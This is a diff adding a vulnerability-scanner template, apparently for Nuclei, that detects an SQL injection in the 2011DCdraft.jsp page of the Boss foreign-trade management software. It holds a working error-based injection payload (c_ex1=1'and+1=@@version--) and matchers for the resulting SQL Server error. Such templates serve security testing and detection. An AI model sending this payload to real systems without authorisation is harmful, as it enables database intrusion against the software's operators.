@@ -1,0 +1,29 @@
+id: poc-yaml-51boss-2011dcdraft-jsp-sqli
+info:
+  name: 博斯外贸管理软件 2011DCdraft.jsp SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/crm/module/2011DCdraft.jsp?c_ex1=1'and+1=@@version--"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "java.sql.SQLException"
+          - "Microsoft SQL Server"
+      - type: word
+        part: body
+        words:
+          - "草稿箱"
+          - "数据类型"
+      - type: regex
+        part: body
+        regex:
+          - "将(.*?)值"
